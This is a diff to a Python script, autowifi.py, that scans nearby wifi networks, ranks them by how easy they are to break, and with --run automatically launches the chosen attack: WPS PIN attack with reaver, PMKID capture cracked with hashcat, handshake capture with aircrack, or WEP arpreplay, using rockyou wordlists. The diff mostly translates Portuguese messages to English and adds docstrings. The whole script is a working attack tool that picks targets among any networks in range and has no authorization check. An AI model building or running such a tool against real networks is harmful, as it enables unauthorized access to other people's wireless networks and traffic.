@@ -1,18 +1,21 @@
 #!/usr/bin/env python3
 # language: Python 3.8+
 # file: autowifi.py
-# target: Alpine Linux (proot/Termux) + generic Linux — wifi recon + auto attack picker
+# target: Alpine Linux (proot/Termux) + generic Linux — wifi recon + automatic attack picker
 # deps:
 #   Alpine:  apk add python3 iw wireless-tools aircrack-ng
 #   Termux:  pkg install python termux-api
 # usage:
-#   python3 autowifi.py                 # detecta + recomenda (não toca em rede)
-#   python3 autowifi.py --run           # executa o melhor plano
+#   python3 autowifi.py                 # detect + recommend (never touches the network)
+#   python3 autowifi.py --run           # execute the best plan
 #   python3 autowifi.py --target <bssid|ssid>
 #   python3 autowifi.py --json
-#   python3 autowifi.py --install       # instala deps do SO detectado
+#   python3 autowifi.py --scan-json scan.json   # use a saved scan instead of scanning live
+#   python3 autowifi.py --install       # install dependencies for the detected OS
 
 import argparse, glob, json, os, re, shutil, subprocess, sys, time
+
+__version__ = "0.3.0"
 
 TOOLS = ["termux-wifi-scaninfo", "termux-wifi-connectioninfo", "iw", "iwlist", "nmcli",
          "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng",
@@ -27,11 +30,12 @@ def run(cmd, use_sudo=False, timeout=None, capture=True):
         r = subprocess.run(cmd, timeout=timeout, capture_output=capture, text=True)
         return r.returncode, (r.stdout or "") + (r.stderr or "")
     except FileNotFoundError:
-        return 127, f"não encontrado: {cmd[0]}"
+        return 127, f"not found: {cmd[0]}"
     except subprocess.TimeoutExpired:
         return 124, "timeout"
 
 def find_termux_bin(name):
+    """Locate a Termux:API binary, including across the proot bind mounts."""
     tb = os.environ.get("TERMUX_BIN")
     cands = [
         os.path.join(tb, name) if tb else None,
@@ -46,7 +50,7 @@ def find_termux_bin(name):
             return c
     return None
 
-# ---------------------------------------------------------------- ambiente
+# ---------------------------------------------------------------- environment
 
 def detect_env():
     env = {"tools": {}, "is_root": os.geteuid() == 0}
@@ -66,6 +70,7 @@ def detect_env():
     return env
 
 def wireless_ifaces():
+    """List wireless interfaces found under /sys/class/net."""
     out = []
     for d in sorted(glob.glob("/sys/class/net/*")):
         name = os.path.basename(d)
@@ -74,6 +79,7 @@ def wireless_ifaces():
     return out
 
 def monitor_capable(iface):
+    """True if the interface's phy advertises monitor mode. None if unknown."""
     phy = f"/sys/class/net/{iface}/phy80211/name"
     if os.path.exists(phy):
         try:
@@ -89,6 +95,7 @@ def monitor_capable(iface):
 # ---------------------------------------------------------------- scan
 
 def freq_to_ch(f):
+    """Convert a center frequency in MHz to its channel number."""
     if f == 2484: return 14
     if 2412 <= f <= 2472: return (f - 2407) // 5
     if 5180 <= f <= 5825: return (f - 5000) // 5
@@ -96,6 +103,7 @@ def freq_to_ch(f):
     return 0
 
 def scan(env):
+    """Try each available scan backend and return (aps, backend_name)."""
     if env["tools"]["termux-wifi-scaninfo"]:
         aps = scan_termux(env)
         if aps: return aps, "termux-api"
@@ -108,8 +116,8 @@ def scan(env):
     return [], None
 
 def load_scan_json(path):
-    """Lê um scan salvo (saída do termux-wifi-scaninfo OU do próprio --json).
-    Permite escanear no Termux nativo e rodar classify/plano/crack no Alpine."""
+    """Read a saved scan (output of termux-wifi-scaninfo OR of --json).
+    Lets you scan in native Termux and run classify/plan/crack inside Alpine."""
     with open(path, "r", encoding="utf-8", errors="ignore") as f:
         data = json.load(f)
     if isinstance(data, dict) and "aps" in data:
@@ -153,6 +161,7 @@ def scan_nmcli():
     return aps
 
 def split_nmcli(line):
+    """Split an nmcli -t line on unescaped ':'."""
     parts, buf, i = [], "", 0
     while i < len(line):
         if line[i] == "\\" and i + 1 < len(line):
@@ -164,8 +173,7 @@ def split_nmcli(line):
     return parts
 
 def scan_iw(env):
-    if not env["ifaces"]: return []
-    rc, out = run(["iw", "dev", env["ifaces"][0], "scan"], use_sudo=True)
+    rc, out = run(["iw", "dev", env["ifaces"][0], "scan"], use_sudo=True) if env["ifaces"] else (1, "")
     if rc != 0: return []
     aps, cur = [], None
     for line in out.splitlines():
@@ -189,9 +197,10 @@ def scan_iw(env):
             cur["caps"] += " " + s
     return aps
 
-# ---------------------------------------------------------------- classificação + plano
+# ---------------------------------------------------------------- classification + plan
 
 def classify(ap):
+    """Set ap['sec'] and ap['wps'] from the scan capabilities string."""
     c = ap["caps"].upper()
     if "SAE" in c or "WPA3" in c:      ap["sec"] = "wpa3"
     elif "WPA2" in c or "RSN" in c:    ap["sec"] = "wpa2"
@@ -203,6 +212,8 @@ def classify(ap):
     return ap
 
 def plan_for(ap, env):
+    """Pick an attack method + priority score for a single AP.
+    Lower score = tried first. Open networks score last (nothing to crack)."""
     mon = env.get("monitor_if")
     T = env["tools"]
     if ap["wps"] and T["reaver"]:
@@ -210,22 +221,23 @@ def plan_for(ap, env):
                 "needs_monitor": True, "mon": mon}
     s = ap["sec"]
     if s == "wpa3":
-        return {"score": 99, "method": "WPA3/SAE — fora do pipeline", "needs_monitor": False, "mon": mon}
+        return {"score": 99, "method": "WPA3/SAE — out of scope", "needs_monitor": False, "mon": mon}
     if s in ("wpa2", "wpa"):
         if T["hcxdumptool"]:
             return {"score": 2, "method": "PMKID + hashcat", "needs_monitor": True, "mon": mon}
         return {"score": 2, "method": "handshake + aircrack", "needs_monitor": True, "mon": mon}
     if s == "wep":
         return {"score": 4, "method": "WEP arpreplay (aircrack)", "needs_monitor": True, "mon": mon}
-    return {"score": 5, "method": "rede aberta — conecta direto", "needs_monitor": False, "mon": mon}
+    return {"score": 5, "method": "open network — connect directly", "needs_monitor": False, "mon": mon}
 
 def rank(aps, env):
+    """Classify every AP, attach a plan, and sort by (score, strongest signal)."""
     for a in aps:
         classify(a)
         a["plan"] = plan_for(a, env)
     return sorted(aps, key=lambda a: (a["plan"]["score"], -a["signal"]))
 
-# ---------------------------------------------------------------- execução
+# ---------------------------------------------------------------- execution
 
 def run_live(cmd, env, timeout=None):
     print("  $ " + " ".join(cmd))
@@ -233,9 +245,10 @@ def run_live(cmd, env, timeout=None):
         subprocess.run(((["sudo"] if (os.geteuid() != 0 and shutil.which("sudo")) else []) + cmd),
                        timeout=timeout)
     except KeyboardInterrupt:
-        print("\n[!] interrompido")
+        print("\n[!] interrupted")
 
 def enable_monitor(env):
+    """Put the monitor-capable interface into monitor mode and return its name."""
     if not env["monitor_if"]:
         return None
     iface = env["monitor_if"]
@@ -254,25 +267,26 @@ def enable_monitor(env):
     return iface
 
 def execute(ap, env):
+    """Run the plan attached to a single AP."""
     plan = ap["plan"]
-    print(f"\n[*] alvo: {ap['ssid'] or '<oculto>'}  {ap['bssid']}  ch{ap['ch']}  {ap['sec']}"
+    print(f"\n[*] target: {ap['ssid'] or '<hidden>'}  {ap['bssid']}  ch{ap['ch']}  {ap['sec']}"
           + ("  WPS" if ap["wps"] else ""))
-    print(f"[*] plano: {plan['method']}")
+    print(f"[*] plan: {plan['method']}")
 
     if plan["needs_monitor"] and not env["monitor_if"]:
-        print("[!] SEM adaptador monitor-capable neste ambiente.")
-        print("    Termux/Android interno não faz monitor mode. Precisa de:")
-        print("      - adaptador USB wifi monitor-capable (AR9271 / RTL8812AU / MT7612U) + OTG")
-        print("      - root (tsu) e o driver em modo monitor")
-        print("    Alternativa: captura em outro PC e roda só o cracker aqui (wpa_crack.py).")
+        print("[!] NO monitor-capable adapter in this environment.")
+        print("    The internal Termux/Android radio cannot do monitor mode. You need:")
+        print("      - a monitor-capable USB wifi adapter (AR9271 / RTL8812AU / MT7612U) + OTG")
+        print("      - root (tsu) and the driver in monitor mode")
+        print("    Alternative: capture on another PC and run only the cracker here (wpa_crack.py).")
         return
 
-    if plan["method"].startswith("rede aberta"):
-        print("[*] rede aberta — sem senha pra descobrir. conecta e pronto.")
+    if plan["method"].startswith("open network"):
+        print("[*] open network — no password to recover. Just connect.")
         return
 
     mon = enable_monitor(env)
-    print(f"[*] interface monitor: {mon}")
+    print(f"[*] monitor interface: {mon}")
     T = env["tools"]
 
     if plan["method"].startswith("WPS"):
@@ -290,7 +304,7 @@ def execute(ap, env):
             print(f"[*] cracking: hashcat -m 22000 {out}.hc22000 {wl}")
             run_live([T["hashcat"], "-m", "22000", out + ".hc22000", wl], env)
         else:
-            print(f"[*] alvo salvo: {out}.hc22000  → rode hashcat -m 22000 nele")
+            print(f"[*] target saved: {out}.hc22000  → run hashcat -m 22000 on it")
         return
 
     if plan["method"].startswith("handshake"):
@@ -318,6 +332,7 @@ def execute(ap, env):
         return
 
 def first_wordlist():
+    """Return the first wordlist that exists on disk, or a sane default."""
     for w in ["/usr/share/wordlists/rockyou.txt", "/usr/share/wordlists/rockyou.txt.gz",
               "/data/data/com.termux/files/usr/share/wordlists/rockyou.txt", "./rockyou.txt"]:
         if os.path.exists(w):
@@ -337,18 +352,19 @@ def install_deps(env):
         run(["pkg", "install", "-y", "python", "termux-api", "iw", "wireless-tools", "root-repo"], capture=False)
         run(["pkg", "install", "-y", "aircrack-ng", "hashcat"], capture=False)
     else:
-        print("[!] SO não reconhecido (nem apk nem pkg). instale na mão.")
+        print("[!] Unrecognized OS (neither apk nor pkg). Install the dependencies manually.")
 
 # ---------------------------------------------------------------- main
 
 def main():
-    ap = argparse.ArgumentParser(description="wifi recon + auto attack picker")
-    ap.add_argument("--run", action="store_true", help="executa o melhor plano")
-    ap.add_argument("--target", help="força alvo por bssid ou ssid")
-    ap.add_argument("--json", action="store_true")
+    ap = argparse.ArgumentParser(description="wifi recon + automatic attack picker")
+    ap.add_argument("--run", action="store_true", help="execute the best plan")
+    ap.add_argument("--target", help="force a target by bssid or ssid")
+    ap.add_argument("--json", action="store_true", help="print the ranked result as JSON")
     ap.add_argument("--scan-json", metavar="FILE",
-                    help="usa um scan salvo (termux-wifi-scaninfo ou --json) em vez de escanear ao vivo")
-    ap.add_argument("--install", action="store_true")
+                    help="use a saved scan (termux-wifi-scaninfo or --json) instead of scanning live")
+    ap.add_argument("--install", action="store_true", help="install dependencies for the detected OS")
+    ap.add_argument("--version", action="version", version=f"autowifi {__version__}")
     a = ap.parse_args()
 
     env = detect_env()
@@ -356,17 +372,17 @@ def main():
         install_deps(env); return
 
     if not a.json:
-        print(f"[*] ambiente: {'alpine ' if env['alpine'] else ''}{'termux ' if env['termux'] else ''}"
-              f"root={'sim' if env['is_root'] else 'não'} "
-              f"ifaces={env['ifaces'] or 'nenhuma'} "
-              f"monitor={'sim' if env['monitor_if'] else 'NÃO'}")
+        print(f"[*] environment: {'alpine ' if env['alpine'] else ''}{'termux ' if env['termux'] else ''}"
+              f"root={'yes' if env['is_root'] else 'no'} "
+              f"ifaces={env['ifaces'] or 'none'} "
+              f"monitor={'yes' if env['monitor_if'] else 'NO'}")
         if env["monitor_if"] is None:
-            print("[!] nenhum adaptador monitor-capable — ataque ao vivo indisponível aqui.")
+            print("[!] no monitor-capable adapter — live attack unavailable here.")
 
     aps, backend = (load_scan_json(a.scan_json), "json") if a.scan_json else scan(env)
     if not aps:
-        print("[!] scan vazio. Termux: instale termux-api + app, dê permissão de localização. "
-              "Linux: instale nmcli/iw, ou rode com root.")
+        print("[!] empty scan. Termux: install termux-api + the app, grant location permission. "
+              "Linux: install nmcli/iw, or run as root.")
         return
     aps = rank(aps, env)
     if a.target:
@@ -377,20 +393,20 @@ def main():
         print(json.dumps({"backend": backend, "monitor_if": env["monitor_if"], "aps": aps}, indent=2))
         return
 
-    print(f"\n[*] {len(aps)} redes (scan via {backend}). plano por alvo:\n")
-    hdr = f"{'SIG':>5}  {'CH':>3}  {'SEC':<5} {'WPS':<3} {'ALVO':<22} {'MÉTODO'}"
+    print(f"\n[*] {len(aps)} networks (scan via {backend}). plan per target:\n")
+    hdr = f"{'SIG':>5}  {'CH':>3}  {'SEC':<5} {'WPS':<3} {'TARGET':<22} {'METHOD'}"
     print(hdr); print("-" * len(hdr))
     for x in aps:
         print(f"{x['signal']:>5}  {x['ch']:>3}  {x['sec']:<5} "
-              f"{'sim' if x['wps'] else '-':<3} {(x['ssid'] or '<oculto>')[:22]:<22} {x['plan']['method']}")
+              f"{'yes' if x['wps'] else '-':<3} {(x['ssid'] or '<hidden>')[:22]:<22} {x['plan']['method']}")
 
     best = aps[0]
-    print(f"\n[*] melhor opção: {best['ssid'] or best['bssid']}  →  {best['plan']['method']}")
+    print(f"\n[*] best option: {best['ssid'] or best['bssid']}  →  {best['plan']['method']}")
 
     if a.run:
         execute(best, env)
     else:
-        print("[*] (dry-run) rode com --run pra executar. --target <bssid> força outro alvo.")
+        print("[*] (dry-run) run with --run to execute. --target <bssid> forces another target.")
 
 
 if __name__ == "__main__":
